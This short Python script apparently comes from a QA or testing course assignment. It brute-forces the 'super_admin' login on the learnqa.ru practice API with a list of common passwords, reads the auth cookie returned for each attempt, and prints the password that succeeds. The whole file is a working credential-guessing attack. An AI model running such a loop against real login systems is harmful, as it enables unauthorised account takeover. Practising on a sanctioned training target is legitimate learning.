import requests
login = "super_admin"
pwd_list = ['qazwsx', 'qwerty', 'letmein', '123123', 'password', 'qwerty123', 'flower', 'batman', 'Football', 'donald', '1234567890', '654321', '1234567', '123456789', 'qwertyuiop', 'trustno1', '12345', 'ashley', 'abc123', '000000', 'charlie', 'adobe123[a]', 'login', '7777777', 'zaq1zaq1', 'access', '121212', '123qwe', 'monkey', '123456', 'michael', '!@#$%^&*', '888888', 'lovely', 'iloveyou', '1234', 'solo', 'photoshop[a]', 'shadow', 'azerty', 'passw0rd', 'welcome', 'princess', '111111', '12345678', 'baseball', 'superman', 'jesus', 'password1', 'hottie', '696969', 'football', 'master', 'mustang', '1q2w3e4r', 'aa123456', 'admin', 'loveme', '555555', '666666', 'ninja', 'bailey', 'sunshine', 'dragon']
good = "You are authorized"
wrong = "You are NOT authorized"

for pwd in pwd_list:
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data = {"login": login, "password": pwd}) # Возвращает auth_cookie для верного логина
    cookie_value = response1.cookies.get('auth_cookie')
    #print(cookie_value)
    cookies = {}
    if cookie_value is not None:
        cookies.update({"auth_cookie": cookie_value})
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies = cookies)
    if response2.text == good:
        print(f"Правильный пароль = {pwd}")
    else:
        continue


